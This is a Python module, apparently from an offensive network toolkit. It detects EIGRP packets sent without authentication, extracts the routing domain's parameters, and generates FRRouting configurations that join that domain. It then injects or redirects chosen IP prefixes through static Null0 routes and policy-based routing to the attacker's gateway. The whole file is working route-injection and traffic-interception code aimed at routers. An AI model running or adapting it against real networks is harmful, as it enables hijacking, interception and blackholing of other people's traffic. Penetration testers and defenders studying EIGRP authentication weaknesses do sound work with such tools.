import sys
sys.path.append("..")
import protocol_parser
from state import user_var
import utility

def detect_if_vulnerable(packet):
    return not packet.haslayer('EIGRPAuthData')

def get_packet_data(packet):
    source_mac, source_ip, destination_mac, destination_ip = protocol_parser.get_data_from_layer_two_and_three(packet)
    asn = packet['EIGRP'].asn
    hold_time = packet['EIGRPParam'].holdtime
    return source_mac, source_ip, destination_mac, destination_ip, asn, hold_time

def build_configurations(packet):

    eigrpd_config = '' + '!\n'
    eigrpd_config += f'router eigrp {str(packet.asn)}\n'
    eigrpd_config += f' network {utility.get_ip_address_from_interface(user_var.interface)}/32\n'


    staticd_config = ''
    pbrd_config = ''

    if user_var.inject or user_var.redirect:

        count = 0

        eigrpd_config += ' redistribute static\n'
        staticd_config += '!\n'
        pbrd_config += '!\n'
        pbrd_config += f'interface {user_var.interface}\n'
        pbrd_config += ' pbr-policy PBRMAP\n'

        for ip in user_var.ipaddress:
            staticd_config += f'ip route {ip} Null0\n'

            count += 1
            pbrd_config += '!\n'
            pbrd_config += f'pbr-map PBRMAP seq {count}\n'
            pbrd_config += f' match dst-ip {ip}\n'
            pbrd_config += f' set nexthop {utility.get_default_gateway()}\n'

        for ip in user_var.redirectaddresses:
            staticd_config += f'ip route {ip} Null0\n'

            count += 1
            pbrd_config += '!\n'
            pbrd_config += f'pbr-map PBRMAP seq {count}\n'
            pbrd_config += f' match dst-ip {ip}\n'
            pbrd_config += f' set nexthop {utility.get_default_gateway()}\n'

    eigrpd_config += '!\n'
    staticd_config += '!\n'
    pbrd_config += '!\n'

    return eigrpd_config, staticd_config, pbrd_config